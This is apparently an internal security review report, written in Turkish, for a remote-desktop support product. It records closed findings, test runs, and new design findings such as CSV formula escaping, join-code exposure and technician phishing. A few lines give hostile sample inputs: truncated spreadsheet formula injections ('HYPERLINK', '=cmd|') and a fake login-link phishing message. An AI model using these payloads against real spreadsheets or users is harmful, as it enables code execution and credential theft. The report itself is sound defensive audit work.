| --------------------- | ---------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| S7-12 [YÜKSEK]        | **KAPANDI** (statik). Windows adım 38 bekliyor | `internal/control/origin.go:6-9`: `IMO_UNAVAILABLE=0, IMO_HARDWARE=1, IMO_INJECTED=2, IMO_SYSTEM=4`, winuser.h ile birebir. `OriginInjected` (`:16-18`) `!ok \|\| origin != IMO_HARDWARE` döndürüyor, yani fail-closed: yalnız başarılı sorguda donanım girdisi yerel sayılıyor; birleşik ve bilinmeyen değerler (8, 1\|2, 0xFFFFFFFF) enjekte. `CharInjected` (`:23-28`) WM_(SYS)CHAR kaynağı bilinmiyorsa onu üreten WM_(SYS)KEYDOWN kararını kullanıyor, o karar da fail-closed. TranslateMessage karakteri tuş basışıyla aynı hwnd'ye gönderdiği için bayat bir karar devralınmıyor. Çağrı yolu: `form_windows.go:146-162` `track` → `userInput` (`:166`) → `control_windows.go:126-127` `tryGrant`. Kontrol, monitör ve dosya diyaloglarının üçü de `newConsent` ile aynı `consentDlg`'yi kullanıyor. Alt+İ yolu `WM_SYSCHAR` → `CharInjected`. Grep: `imoInjected`/`InputInjected` repoda yok. `win.InputOrigin` (`win_windows.go:327`) yalnız ham değeri döndürüyor ve tek çağıranı `track`. Birim test: `TestS712OriginInjectedFailClosed`, `TestS712CharInjected` (platformdan bağımsız, linux CI'da da koşuyor). |
| S7-12 UIAccess sınırı | Kabul edildi (bilgi)                           | UIAccess'li bir sürecin `SendInput`'u IMO_HARDWARE görünüyor. Bu yol imzalı ve güvenli konumda (Program Files/System32) kurulu yerel bir uygulama gerektiriyor. Teknisyenin elinde yalnız istemcinin `SendInput`'u var (INJECTED). Tehdit modeli dışında. `origin.go:15` ve implementation.md "Kararlar 1"de yazılı. Yerel kötü amaçlı yazılım zaten müşteri oturumunda istediğini yapabilir.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| S7-13                 | KAPANDI                                        | `applier.go:139-152` `heldReleaseLocked`: hız sınırından yalnız `a.keys`/`a.buttons`'ta gerçekten basılı olanın bırakılması muaf. `translate` (`m.btn`, `:200-204`) basılı olmayan düğmeyi bırakmayı no-op yapıyor, hareket de enjekte edilmiyor. Muafiyet her basış için bir kez kullanılabiliyor (enjeksiyon kaydı siliyor), basış da jeton harcıyor. Askıdayken (AC-104) muaf bırakmalar `Allow`'da düşüyor ve enjekte edilmiyor, yük yalnız ayrıştırma. `TestS713ReleaseExemptionOnlyForHeld` yeşil.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| S7-14                 | KAPANDI (statik)                               | `form_windows.go:116-124`: `track` → `handle` → `t.cur = inputMark{}`. Sonraki `GetMessage` içinde teslim edilen gönderilmiş BM_CLICK işaretsiz kalıyor, `userInput` false. Win32 döngüsü olduğu için birim testi yok, kabul edilebilir.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| S7-15                 | KAPANDI                                        | `control.ts:406-408` `resetOnGuestGone` her kopmada `monitorPending` ve `guestEnv`'i temizliyor. `onShareMonitor` (`:252-253`) yalnız `guest.peer === monitorPending.peer` ise karşılıyor. `handleMonitorRequest` (`:194`) etkin monitör için `VALIDATION` döndürüyor ve sayaç düşmüyor. İletim `pending.peer`'e yapılıyor, süpersede koşulu bağlantı değişimini de kapsıyor (`:204`). Ek kontrol: WS açıkken PC kopması (K6) monitör diyaloğunu mesajsız kapatıyor, `monitorPending.peer` aynı kalıyor. Go istemci monitörü yalnız ilk `hello`'da seçiyor (`flow.go:487-507`), sonrasında yalnız onaylı `monitor.request` ile değiştiriyor (`control.go:165-198`). Yeniden kurulan PC'nin `share.state`'i bekleyen kimliği bildiremez, sahte `monitor.granted` yolu yok.                                                                                                                                                                                                                                                                                                                                                  |
| S7-16                 | KAPANDI (statik). Windows adım 37 bekliyor     | `gate.go`: `state = nesil<<1\|açık` tek atomik değerde, CAS ile tutuluyor. `Shut` kapanan neslin değerini goroutine'deki dinleyiciye veriyor. `host_windows.go:149-154` `wmHooksOff` kancayı yalnız `StillClosed(gen)` ise kaldırıyor. wParam okuması amd64 MSG düzeniyle uyumlu (`msg[16]`). Bayat kaldırma yok sayılıyor. Kapanmamış kanca yalnız AC-104 askısını tetikleyebilir, bu da güvenli yöndedir. `TestS716StaleHooksOffIgnoredAfterReopen` ve `TestS716GenerationRaceFree` -race altında yeşil.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| S7-9                  | KAPANDI (K8)                                   | Aşağıda K8 maddesi.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| S7-11                 | İZLEME                                         | Değişmedi. P9/P10 güvenlik turunda giriş şartı.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |

### Mimar kararlarının (K6–K8) güvenlik incelemesi

- **K6 (`onView`, `control.ts:358-372`)** — REQUESTED durumunda gelen `{VIEW, UI\|HOTKEY\|SYSTEM}` isteği iptal ediyor. Consent yazılmıyor, `deniedAt` başlamıyor, `requests` geri verilmiyor. Kötüye kullanım değerlendirmesi:
  - _Sayaç/cooldown atlatma:_ Mesajı yalnız misafir (AGENT) gönderebiliyor. Teknisyen şemasında `control.state` yok, gelirse 1008. Bekleme olmaması yalnız teknisyenin lehine. Misafir bunu istese de zaten "Reddet" ile aynı sonucu alabiliyor. Teknisyenin 5 istek kotası her iki yolda da harcanıyor. Yeni yetki doğmuyor.
  - _Audit şişirme:_ `control.cancelled{by:"agent"}` yalnız `state === "REQUESTED"` iken yazılıyor. Her satır teknisyenin başlattığı bir `control.requested`'e karşılık geliyor; kota oturum başına ≤ 5. VIEW'da tekrar gelen mesaj `:356` ile kayıt üretmiyor. Sınırlı.
  - _Yarış:_ `onView` `enqueue` ile `onGranted` ile sıralı çalışıyor. `granting` iken iptal araya giremiyor. Geç gelen `VIEW/SYSTEM`'in yeni isteği kapatması kapatma yönünde ve mimarca kabul edildi (reqId genişleme noktası).
  - _Ret izinin silinmesi (bilgi):_ Kötü niyetli ya da değiştirilmiş bir istemci DENIED yerine `VIEW/UI` göndererek consent'e "ret" düşmeden isteği kapatabiliyor. Audit'te `by:"agent", source:"UI"` olarak ayrı ve izlenebilir şekilde kalıyor. Gerçek Go istemcisi yalnız `SYSTEM` gönderiyor. Etki yok, bulgu açılmadı. İstenirse P8 zaman çizelgesinde `source≠SYSTEM` olan iptaller "beklenmeyen" diye işaretlenebilir (öneri).
- **K8 `selfElevated`** — `ws.ts:144` `z.strictObject` içinde `z.boolean()` zorunlu. Eksik ya da null değer 1008 alıyor (contracts testi ve entegrasyon testi var). Sunucu alanları yeniden kurarak iletiyor (`handleEnvState`, `:270`), tarayıcı misafirinden gelen değeri yok sayıyor. Audit değeri yalnız `"true"\|"false"\|"unknown"` sabitlerinden üretiliyor (`:276`). İstemci kaynaklı serbest metin yok. Go: `messages.go:224` `json:"selfElevated"`, `omitempty` yok. Değer `env.SelfElevated()` (`TokenElevation`) ile açılışta bir kez ölçülüyor. Değer istemcinin beyanı ve değiştirilmiş bir istemci yalan söyleyebilir. Bu bilgilendirme amaçlı bir alan, kontrol kararı buna dayanmıyor. Kabul edildi.
- **VALIDATION kuralı** — Etkin monitör için `VALIDATION` dönülüyor. Hata yalnız isteyen teknisyene gidiyor ve teknisyen etkin monitörü zaten görüyor, bilgi sızıntısı yok. Sayaç ve metrik tutarlı.
- **Konsol** — Rozet yalnız boolean `control.selfElevated` ile koşullanıyor ve metin i18n'den geliyor (`stage.tsx:169-173`), XSS yüzeyi yok. CONFLICT `notice` olarak sunucu metnini React metin düğümünde gösteriyor (`control-button.tsx:83,106`). Değişen dosyalarda `dangerouslySetInnerHTML` yok. Monitör kilidi (`canRequestMonitor`, `MONITOR_BLOCK_MS`) yalnız arayüz kolaylığı. Yetkili karar sunucuda (`handleMonitorRequest` CONFLICT/RATE_LIMITED/VALIDATION). Kontrol isteğine gelen VALIDATION yok sayılıyor ve faz değişmiyor.

### Yeni bulgular

Yok.

### Otomatik tarama / test çıktıları (2026-11-11)

- Go (`golang:1.26.11-bookworm`, `apps/agent-win`): `gofmt -l .` boş. `go vet ./...` ve `GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go vet ./...` temiz (VET_OK). `go test -race -count=1 ./...` sonucunda **15/15 paket ok**.
- `pnpm --filter @remote/server test`: **12 dosya / 244 test** yeşil. `pnpm --filter @remote/contracts test`: **4 dosya / 43 test** yeşil.
- Bağımlılık: `git diff HEAD -- apps/agent-win/go.mod apps/agent-win/go.sum pnpm-lock.yaml` boş. govulncheck ve pnpm audit Tur 2'de temiz çıkmıştı (3 çağrılmayan x/net ve x/crypto kaydı, Dependabot).
- Gizli bilgi kalıbı (`git grep` + izlenmeyen P7 dizinleri): eşleşme yok.
- Entegrasyon testleri (`test:int`, MySQL) bu turda koşulmadı. Backend raporu: 23 dosya / 186 test yeşil.

### Tasarımda vaat edilip kodda bulunmayanlar

Yok. G-03 enjekte girdi koruması, K6, K7, K8 ve S7-15 temizliği kodda karşılığını buldu.

### Windows elle doğrulama bekliyor (GEÇTİ'yi engellemez; `docs/gereksinimler.md` "Sonra / açık — P7'den")

- Adım 37: kısayol ve ardından hemen yeniden izin (S7-16). Kancalar kurulu kalmalı, AC-104 yerel öncelik çalışmalı.
- Adım 38: S7-12. Üç diyalogda (kontrol, monitör, dosya) müşterinin gerçek tıklaması ve Alt+İ ile **izin verilebilmeli**, teknisyenin `SendInput` tıklaması ve Alt+İ'si **izin verememeli**.
- Adım 39, 40.
- Adım 42: yönetici olarak açılışta konsol rozeti ve GRANTED audit'inde `selfElevated:"true"`.
  Adım 38 gerçek Windows'ta başarısız olursa (ör. müşteri tıklaması reddedilirse ya da enjekte tıklama kabul edilirse) G-03 açık sayılır ve **Yüksek** olarak yeniden açılır.

### Olumlu

- Kaynak kararı Win32'den ayrılmış saf bir fonksiyonda tutuluyor ve her sabit için test var. Tur 2'deki türden bir hata artık linux CI'da yakalanıyor.
- Kapı durumu ve nesli tek atomik değerde tutuluyor. Kilitsiz tasarım korunmuş.
- K6/K8 sözleşmesi contracts, sunucu, Go ve konsolda tutarlı ve ortak fixture ile iki dilde test ediliyor.

### Öneri (`docs/gereksinimler.md` §9 "Sonra")

- P8 zaman çizelgesinde `control.cancelled{by:"agent"}` kayıtlarından `source≠SYSTEM` olanlar "beklenmeyen istemci davranışı" olarak işaretlenebilir (bilgi).
- Go `x/net`/`x/crypto` yükseltmesi Dependabot ile yapılabilir (Tur 2'den taşınan madde).

DURUM: GEÇTİ (Kritik 0 / Yüksek 0; S7-12..S7-16 ve S7-9 kapandı; Windows adım 37/38/42 elle doğrulama bekliyor)

---

## P8 — Tur 1 — Oturum geçmişi (2026-11-11)

DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 4

Kapsam: commit edilmemiş P8 değişiklikleri. Sunucu tarafında `src/sessions/{service,history,history-repo,routes,repo}.ts`, `lib/csv.ts`, `audit/mask.ts`, `auth/guards.ts` (`requireAnyPerm`), `signaling/admit.ts` ve `public/service.ts`. Contracts tarafında `api/sessions.ts` ve `labels.ts`. Ayrıca migration'lar `20261111060000_p8_session_history` ile `20261111070000_enum_check_binary` (ADR-0014, precheck), web `app/(panel)/history/**` ile `lib/history/*` ve Go `internal/capture/cursor.go` ile `dxgi_windows.go`.

### Bulgular (öncelik sırasıyla)

#### S8-1 [DÜŞÜK] CSV formül kaçışı yalnız ilk karaktere bakıyor (A03 Injection, CSV/formula injection)

Yer: `apps/server/src/lib/csv.ts:9` (`FORMULA_START = /^[=+\-@\t\r]/`)
Sorun: AC-124'teki = + - @ TAB CR karakterlerinin tamamı kapsanıyor. `;` ve `"` RFC 4180'e göre doğru tırnaklanıyor (`NEEDS_QUOTES`). Kapsanmayan iki durum var. Birincisi baştaki boşluk/NBSP ile başlayan değerler: `note` kırpılmıyor, örneğin `"  =HYPERLINK(...)"`. İkincisi tam genişlikli `＝ ＋ － ＠` varyantları. Ad ve ticket alanı JS `trim()` ile kırpıldığı için birincisi bu alanlarda oluşmaz, ikincisi oluşabilir. Bazı tablolama yazılımları ve içe aktarma ayarları baştaki boşluğu atıp hücreyi formül olarak değerlendirebiliyor. Excel'in varsayılan açılışında bu davranış doğrulanmadı.
İstismar senaryosu: Müşteri katılım formunda adını `＝HYPERLINK("http://…","tıkla")` girer, ya da kötü niyetli bir teknisyen notu `" =cmd|…"` olarak yazar. Yönetici CSV'yi formül değerlendiren bir ayarla açtığında hücre çalışır. Kullanıcı etkileşimi ve özel ayar gerektiği için önem Düşük.
Düzeltme: Kontrol baştaki boşlukları atlasın ve tam genişlikli varyantları da kapsasın: `/^[\s 　]*[=+\-@\t\r＝＋－＠]/`. Birim testine her varyant için birer örnek eklenmeli. Atanan: backend-dev

#### S8-2 [DÜŞÜK] Liste yanıtı bekleyen oturumların katılım kodunu (`code`) taşıyor (A01/A04, veri en aza indirme)

Yer: `apps/server/src/sessions/history.ts:72` (`toListItem` → `toView`) ve `apps/server/src/sessions/service.ts:47` (`code: status==="PENDING" ? activeCode : null`)
Sorun: P8'de `GET /sessions` geçmiş ekranının da ucu oldu (`sessions.view` VEYA `session_history.view`). Firma seçmemiş SUPER_ADMIN için kapsam artık tüm tenant'lar. Bu yüzden PENDING durumdaki her oturumun 8 haneli katılım kodu, geçmiş listesi için gerekmediği halde, daha geniş bir kitleye dönüyor: ADMIN'e tenant'taki diğer teknisyenlerin kodları, SA'ya bütün tenant'ların kodları gidiyor. `techVerifyCode` zaten müşteriye gösterilen bir değer (G-01), sır sayılmaz.
İstismar senaryosu: Geçmiş ekranını gören bir kullanıcı başka bir teknisyenin bekleyen kodunu okur ve müşteriden önce katılma isteği gönderir. Teknisyenin admit kodu kontrolü ve kod/IP sınırları devrede olduğu için etkisi düşük. Yine de gereksiz bir veri yüzeyi.
Düzeltme: `code` yalnız oturumun kendi teknisyenine dönsün (`r.technician.id === auth.user.id`), diğer durumlarda `null` olsun. Konsol yalnız kendi kodunu kullandığı için davranış değişmez. Atanan: backend-dev

#### S8-3 [DÜŞÜK] Liste ucunda hız sınırı yok; `customer` araması `%…%` ile tam tarama yapıyor (A04, kaynak tüketimi)

Yer: `apps/server/src/sessions/routes.ts:56`, `apps/server/src/sessions/history-repo.ts:43`
Sorun: Her istek `findMany` ve `count` çalıştırıyor. Baştaki `%` nedeniyle `customer_name` üzerinde indeks kullanılamıyor. SA "tümü" kapsamında bu tüm `support_sessions` tablosunun taranması demek. Export için 5/dk sınırı var, liste ucunda hiç yok. Uç kimlik doğrulama istediği için risk düşük.
Düzeltme: `customer` filtresi doluyken kullanıcı başına bir `FixedWindowCounter` eklenmeli (ör. 60/dk). Alternatif olarak P13 hacmine göre FULLTEXT/n-gram araması değerlendirilebilir. Atanan: backend-dev

#### S8-4 [DÜŞÜK] ADR-0014 precheck adımı runbook'ta yok (A05, işletim)

Yer: `apps/server/prisma/migrations/20261111070000_enum_check_binary/precheck.sql:1`, `docs/runbook.md` (`precheck` geçmiyor)
Sorun: Migration kendini koruyor: uyumsuz satır varsa 3819 hatasıyla hiçbir şey değiştirmeden duruyor. Bu yüzden veri bütünlüğü açısından fail-closed. Ancak yayın adımlarında precheck'in migrate'ten önce çalıştırılması yazılı değil. Dosyadaki "satırları elle DÜZELTMEYİN (KVKK kanıtı)" uyarısı da operatöre ulaşmıyor.
Düzeltme: Runbook'un yayın bölümüne precheck komutu ve "0 değilse mimara bildir" adımı eklenmeli. Atanan: devops

### İstenen kontrollerin sonucu

- **IDOR / kapsam (AC-61):** Liste, `:id`, `:id/history`, PATCH ve export'un hepsi `historyScope(auth)` kullanıyor (`service.ts:38-42`). `historyWhere` kapsamı filtreden sonra yazdığı için USER'ın gönderdiği `technicianId` etkisiz kalıyor (`history-repo.ts:37-39`, `resolveFilter` `history.ts:55,61`). Tenant kapsamında `tenantId` sorgu filtresi yok sayılıyor (`history.ts:62`, `history-repo.ts:35`). `{kind:"all"}` markalı bir tür. Onu yalnız tenantId'siz SUPER_ADMIN alıyor; diğer rollerde tenantId yoksa FORBIDDEN dönüyor (`service.ts:39-40`). PATCH'te kapsam UPDATE'in `where`'inde, count 0 ise 404 (`history-repo.ts:170-172`). Alt listelerde (onay, dosya, audit) filtre oturumun kendi `tenantId`'si (`history-repo.ts:134-163`). Kapsamın yanlışlıkla genişlemesine yol açan bir durum bulunmadı. "Tümü" kapsamı yalnız mimari-api §2'de sayılan 5 uçta geçerli; diğer uçlarda `tenantScope` değişmedi.
- **Yetki:** `GET ""` için `requireAnyPerm(sessions.view, session_history.view)`, `GET /:id` için `sessions.view`, `/:id/history` için `session_history.view`, PATCH için `session_history.edit`, export için `session_history.export` gerekiyor. `/export.csv` statik rota olduğu için `/:id`'den önce eşleşiyor, ayrıca `/:id` ULID regex'i istiyor. PATCH, `requireAuth` içinde Origin ve CSRF double-submit kontrolünden geçiyor (`guards.ts:9,48`).
- **LIKE enjeksiyonu:** `escapeLike` `\ % _` karakterlerini kaçışlıyor (`history-repo.ts:29`). Prisma 7'nin kaçışlamadığı entegrasyon testiyle doğrulanmış (`session-history-p8.test.ts:106-132`). `customer` alanı 2–100 karakter, Cc/Cf/bidi içeremiyor, strict şema.
- **PATCH girdisi:** `ticketNo` için `UNSAFE_NAME_CHARS`, trim ve ≤50 kontrolü var. `note` için CRLF→LF dönüşümü, tek `\r` yasağı, yalnız `\n\t` serbest, bidi/sıfır genişlikli karakter yasağı ve ≤4000 sınırı var. DB CHECK'leri zod'dan gevşek, yani zod'dan geçen bir değer CHECK'e takılmıyor. Şema strict ve en az bir alan istiyor.
- **Not metni audit/log'a düşmüyor:** `session.updated` yalnız `ticketNo` ve `noteLength` yazıyor (`history.ts:273-274`). Pino `maskUrl` sorgu dizesini atıyor, bu yüzden `customer` arama metni loga girmiyor. Export audit'i yalnız `customerFilter:boolean` tutuyor (`history.ts:337`).
- **`audit/mask.ts` `ticketNo`:** Anahtar tam eşleşmeyle izinli listeye alınmış. `wsTicket` ve diğer `ticket*` anahtarları maskeli kalıyor. Ticket numarası gizli bir değer değil. **Kabul edildi.**
- **Zaman çizelgesi sızıntısı:** `auditSelect` içinde `ip_address` ve `user_agent` yok. `details` yalnız `TIMELINE_DETAIL_KEYS` izin listesindeki alanları içeriyor, `***` değerleri dönmüyor, string'ler 200 karakterle kesiliyor (`history.ts:96-126`). Ham `old/new_value` dönmüyor.
- **KVKK / onay kayıtları:** `SessionConsentRecord` ip ve UA içermiyor. Yalnız düzey, karar, kaynak ve metin `{id, version, sha256}` dönüyor. E-posta ve not yalnız detayda var, listede yok.
- **CSV DoS:** Sıra şöyle: önce hız sınırı (`FixedWindowCounter(6,60s,60s)`, 6. istek 429), sonra count (>50.000 ise 400, yarım dosya üretilmiyor), sonra audit, sonra 1000'lik keyset partileriyle akış (`Readable.from` backpressure uyguluyor). `written` sayacı akış sırasında artan satırlarda da 50.000'de kesiyor. Yanıt başlıklarında `nosniff` ve `no-store` var, dosya adı sunucu tarafında üretiliyor.
- **admit:** Müşteri adı ve e-postası aynı atomik `consumeForAdmit` UPDATE'inde yazılıyor. `customerOf`, iki kod noktasından kısa adı NULL'a çeviriyor, böylece CHECK yüzünden admit düşmüyor. E-posta zod'da ≤190, kolon VARCHAR(190).
- **XSS:** History sayfalarında `dangerouslySetInnerHTML` ve `innerHTML` yok, kullanıcı verisi `href`'e girmiyor (yalnız ULID `/history/${id}`). Not, ticket, müşteri adı, actorName ve e-posta React metin düğümü olarak render ediliyor. CSV indirme fetch, blob ve `a.download` ile yapılıyor. Not formundaki "kaydedilmemiş değişiklik" yakalayıcısı yalnız aynı origin'e yönlendiriyor.
- **Go imleç ayrıştırma:** `PointerShape.Size()` için `W,H,Pitch ≥ 1` ve `len(Data) ≥ Pitch*H` kontrolleri var. Mono'da H çift ve `Pitch ≥ ⌈W/8⌉`, renkli türde `Pitch ≥ 4W` isteniyor, bilinmeyen tür reddediliyor. Tüm indekslerin sınırlar içinde kaldığını elle kontrol ettim: mono'da `(sy+sh)*Pitch+sx/8 < Pitch*H`, renkli türde `sy*Pitch+4sx+4 ≤ Pitch*H`. Yama `pw×ph` masaüstüne kırpılıyor (`x1=min(X+sw,dw)`), dolayısıyla büyük bir şekil büyük bellek ayırmasına yol açmıyor. `srcOffset` ve NV12 `cuv[x+1]` indeksleri, W/H çift olduğu ve `xe` çifte yuvarlandığı için sınır içinde. Tampon `PointerShapeBufferSize` kadar ayrılıyor ve yeniden kullanılıyor. Bellek taşması bulunmadı.

### Otomatik tarama / test çıktıları (2026-11-11)

- `pnpm audit --audit-level=moderate`: **No known vulnerabilities found**.
- `git diff HEAD --stat -- apps/agent-win/go.mod go.sum` boş, Go bağımlılığı değişmedi. Bu yüzden govulncheck gerekmedi.
- Gizli bilgi kalıbı (`git grep`) P8 dosyalarında eşleşme vermedi. İzlenmeyen `.env` yok.
- `pnpm --filter @remote/server test`: **13 dosya / 255 test** yeşil. `pnpm --filter @remote/contracts test`: **49 test** yeşil. Entegrasyon testleri (MySQL) bu turda koşulmadı.

### Tasarımda vaat edilip kodda bulunmayanlar

Yok. mimari-api "Oturum geçmişi (P8)" §1–5'teki kapsam, izin listesi, PATCH audit, CSV sırası ve sınırlarının hepsi kodda karşılığını buldu.

### Olumlu

- `AllTenantsScope` markalı bir tür. Tüm-tenant kapsamını başka bir modülün kendi başına kurması derleme zamanında engelleniyor.
- Not metni audit'e yazılmıyor. 730 günlük audit saklama süresiyle KVKK'daki "amaçla sınırlılık" ilkesi birlikte korunuyor.
- ADR-0014 ile enum CHECK'leri ikili (büyük/küçük harf duyarlı) karşılaştırma yapıyor. Örneğin `role='admin'` gibi bir değer artık DB'de reddediliyor. Migration uyumsuz satır bulursa kendini durduruyor.

### Öneri (`docs/gereksinimler.md` §9 "Sonra")

- S8-1..S8-4 (hepsi Düşük).

DURUM: GEÇTİ (Kritik 0 / Yüksek 0 / Orta 0 / Düşük 4)

---

## Tasarım turu — E9 (P8b) — Müşteri destek talebi (2026-11-12)

DURUM: DÜZELTİLMELİ
Özet: Kritik 0 / Yüksek 1 / Orta 6 / Düşük 7

Kapsam: `docs/mimari-e9.md` (§2–§8, T28–T38, §5.4), ADR-0016, ADR-0004 r3, ADR-0006 r4, `docs/mimari-api.md` "Destek talepleri (P8b)", `docs/mimari-protokol.md` §5, `docs/tasarim-kontrol.md` E9, `docs/gereksinimler-e9.md`, AC-129..164. Tasarımın "mevcut" dediği kontroller koddan doğrulandı (`signaling/ws.ts`, `admit.ts`, `store.ts`, `lib/{ip,logger}.ts`, `audit/mask.ts`, `auth/guards.ts`, `deploy/Caddyfile`, `deploy/nginx/remote.noktabilisim.net.conf`, `agent-win/internal/{config,pairing}`).

### Bulgular (öncelik sırasıyla)

#### G-E9-1 [YÜKSEK] Talep, makine ve kişi arasında bağ yok; "telefonla doğrulayın" önlemi tasarlandığı haliyle işlemiyor (A07/A04)

Yer: mimari-e9 §5.1, T29; ADR-0016 Karar 3; gereksinimler V16, R11
Sorun: Lobi ve admitCode kaldırıldı (V16). Bunun yerine konan tek önlem kılavuzdaki "tanımadığınız talebi telefonla doğrulayın" cümlesi. Ancak teknisyen ile müşteri arasında karşılaştırabilecekleri ortak bir değer yok. Telefon numarası da talebi açan kişiden geliyor. Talep sırrı yalnızca istemciyle sunucu arasında bir bağ kuruyor; ekran başındaki kişiyle istemci arasında bir bağ kurmuyor.
İstismar senaryosu: Firma bağlantısı müşteri firmanın bütün çalışanlarına dağıtılan, gizli olmayan bir bağlantı. Saldırgan dosyayı ele geçirir ve gerçek bir çalışanın adını, kendi telefon numarasını yazıp "Outlook açılmıyor" diye talep açar. Teknisyen formdaki numarayı arar ve saldırganla konuşur, ya da gerçek çalışanı arar ve "evet talep açtım" cevabını alır. İki durumda da hangi makineye bağlanacağını ayırt edemez. Saldırganın sanal makinesine bağlanır, kontrol sırasında yönetici veya domain şifresi yazar. Bu tuş vuruşları saldırganın makinesinde kaydedilir. Teknisyen müşteriden gelen dosyayı açarsa (AC-117) zararlı yazılım da alabilir.
Öneri (S12 kararını değiştirmez, akışa kapı eklemez):
(a) Sunucu talep oluştururken gösterim amaçlı 4–6 haneli bir `requestCode` üretir. Kod 201 yanıtında döner, istemcinin bekleme ekranında büyük puntoyla görünür ve panelde talep kartında yer alır. WhatsApp mesajına ve audit'e yazılmaz.
(b) Kılavuz ve panel ipucu şöyle düzeltilir: "Müşteriyi **firmanın kayıtlı numarasından** arayın (talepteki numaradan değil) ve ekrandaki talep kodunu sorun."
(c) Panel kartında "bu IP öneki/telefon bu tenant'ta daha önce oturum yaptı mı" bayrağı gösterilir.
(d) S12 tenant ayarı (admitCode) genişlemesi Sonra listesinde öne alınır.
Atanan: mimar (sözleşme: 201 + `SupportRequestItem.requestCode`), backend, frontend, istemci, teknik-yazar

#### G-E9-2 [ORTA] Teknisyen bağlanmadan ACTIVE olan talep odasında caps kaynağı ve "teknisyen yok" zamanlayıcısı tanımsız (A01)

Yer: protokol §5.2 adım 4–5; mevcut `signaling/admit.ts:76-80` (caps `tech.permissions`'tan, `TechConn` gerektirir)
Sorun: Talep akışında misafir, teknisyenden önce kabul edilip oturum ACTIVE olabiliyor. Mevcut kod caps değerini bağlı teknisyenin yetkilerinden hesaplıyor. Tasarım bu durumda caps'in nereden geleceğini ve teknisyen hiç bağlanmazsa odanın ne zaman kapanacağını belirtmiyor. Yanlış bir varsayılan (boş `tech` ya da tüm caps açık) `remote_control.use` veya `file_transfer.use` yetkisi olmayan bir kabulcüye bu yetenekleri verebilir. Ya da müşteri göstergesi açık halde, karşısında kimse olmadan max süre boyunca bekleyebilir.
Öneri:

- Admit anında caps, `technician_id` için DB'deki etkin yetkilerden hesaplanır (pasif kullanıcı ve rol kontrolü dahil).
- Mevcut 120 sn teknisyen kopma zamanlayıcısı admit anında başlatılır.
- Regresyon testi: `remote_control.use` yetkisi olmayan bir kabulcüde caps boş olmalı.
- `accept` yetkisinin `sessions.create` yetkisini kapsadığı bilgisi toggle ekranında açıklanır.
  Atanan: mimar, backend

#### G-E9-3 [ORTA] Onayın tazeliği: ekran paylaşımı onaydan 120 dk sonra müşteri etkileşimi olmadan başlayabiliyor; iptalden sonra gelen kabul tanımsız (A04, KVKK)

Yer: AC-154, protokol §5.1 (`request.cancel` ACCEPTED iken yok sayılır), §5.2 adım 2 (`session_consents` talepteki IP ile yazılır)
Sorun: Onay talep anında alınıyor; paylaşım ise kabul anında kendiliğinden başlıyor. Müşteri bu arada masadan kalkmış ya da ekranında başka içerik açmış olabilir. Ayrıca müşteri "İptal"e bastıktan veya pencereyi kapattıktan sonra gelen `request.accepted` için istemcinin ne yapacağı tanımlı değil. `session_consents` kaydı da karışık kaynaklı: IP talepten, user-agent bağlantıdan geliyor.
Öneri:

- İstemci kabul geldiğinde teknisyen adı ve doğrulama koduyla 5 sn geri sayım ve odaklı "Vazgeç" butonu gösterir. Bekleme belirli bir eşiği (ör. 10 dk) aştıysa tek tık "Bağlan" ister. Bu kararı kullanıcı/mimar verir.
- İptal veya kapatma sonrasında gelen kabul yok sayılır ve `/ws/guest`'e bağlanılmaz.
- Onay kaydına `request_id` (ya da ayrı bir kaynak değeri) eklenir; `decided_at` talep zamanı olarak yazılır.
  Atanan: mimar, istemci, backend

#### G-E9-4 [ORTA] Uzun ömürlü firma dosyası: eski ve açıklı istemci sürümleri sahada süresiz çalışır; asgari sürüm kapısı yok (A06/A08)

Yer: ADR-0006 r4, US-29 ("bir kez indirip saklamak"), mimari-api POST `/public/requests` (`clientVersion` yalnız kaydediliyor)
Sorun: Eski akışta her oturumda taze ikili indiriliyordu; firma dosyası ise aylarca masaüstünde kalır. "Teknisyenden kod aldım" yolu (AC-162) da aynı eski ikiliyle çalışır. Bir güvenlik yaması yayınlandığında eski ikilileri durdurmanın yolu yok.
Öneri:

- `MIN_AGENT_VERSION` tanımlanır (env veya contracts sabiti).
- POST `/public/requests`, `/public/sessions/resolve|join` (AGENT) ve `/ws/guest` (AGENT) için sürüm daha düşükse `CLIENT_OUTDATED` döner.
- İstemci bu durumda "Yeni sürümü indirin" der ve aynı `request-download` bağlantısını tarayıcıda açar.
- Runbook'a "güvenlik yamasında min sürümü yükselt" adımı eklenir.
  Not: değer istemcinin kendi beyanı; zararlı istemciye karşı değil, dürüst kullanıcıyı eski ikiliden korumaya yönelik.
  Atanan: mimar, backend, istemci, devops

#### G-E9-5 [ORTA] WhatsApp mesajına giden müşteri metni, güvenilen göndericiden teknisyene oltalama kanalı oluyor (A03, içerik enjeksiyonu)

Yer: mimari-e9 §6 şablonu; mimari-api `descriptionSchema` (`\n` serbest)
Sorun: Açıklamanın ilk 100 karakteri satır sonu ve URL içerebiliyor. WhatsApp URL'leri otomatik bağlantıya çevirir. Mesaj, teknisyenlerin güvendiği Nokta bildirim numarasından gelir. Saldırgan "Yazıcı çalışmıyor\nPanel: https://remote-noktabilisim.net/login" gibi bir açıklamayla sahte bir panel bağlantısı satırı üretebilir.
Öneri:

- WhatsApp'a giden ad ve açıklama tek satıra indirilir (`\s+` → boşluk).
- URL ve alan adı kalıpları etkisizleştirilir (`.`→`[.]`, `://`→`[:]//`) ya da açıklama hiç gönderilmez (bkz. G-E9-6).
